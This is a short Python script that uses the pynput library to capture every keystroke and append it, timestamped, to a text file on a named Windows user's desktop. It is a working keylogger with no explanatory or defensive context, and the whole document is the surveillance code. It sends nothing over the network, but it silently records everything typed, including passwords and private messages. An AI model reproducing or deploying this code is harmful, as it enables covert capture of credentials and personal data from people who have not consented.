from pynput.keyboard import Key, Listener
import logging

file_log = 'C:\\Users\\Benjamin Pollak\\Desktop\\loggo.txt'

logging.basicConfig(filename=(file_log), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
